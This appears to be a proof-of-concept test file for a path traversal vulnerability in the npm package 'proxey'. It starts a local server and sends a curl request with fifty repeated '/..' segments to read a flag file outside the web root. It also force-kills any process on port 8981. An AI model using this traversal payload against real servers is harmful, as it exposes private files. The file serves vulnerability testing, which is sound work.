const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v20 = '/..'.repeat(50);
    const v21 = v20 + pathToFlag;
    return v21;
};
const v37 = done => {
    const v22 = expect.assertions(1);
    v22;
    const pkg = require('proxey');
    const fs = require('fs');
    const v23 = require('child_process');
    const exec = v23.exec;
    const v24 = fs.readFileSync(pathToFlag);
    let hostsFile = v24.toString();
    const a = require('child_process');
    try {
        const v25 = () => {
        };
        const v26 = a.execSync('fuser -k 8981/tcp', v25);
        v26;
    } catch (e) {
    }
    const v27 = {};
    v27['X-Api-Token'] = '12345';
    const v28 = {};
    v28['/'] = 'home.html';
    v28['/users'] = 'users.html';
    v28['/api/users'] = 'users.json';
    const v29 = {
        rootFolder: './',
        port: 8981,
        proxyUrl: '/proxy',
        vars: v27,
        routes: v28,
        charset: 'utf-8'
    };
    const v30 = pkg.run(v29);
    v30;
    const v31 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8981${ v31 }"`;
    const v35 = (error, stdout) => {
        const v32 = expect(stdout);
        const v33 = v32.toBe(hostsFile);
        v33;
        const v34 = done();
        v34;
    };
    const v36 = exec(attack_string, v35);
    v36;
};
const v38 = test('Path Traversal in proxey', v37);
v38;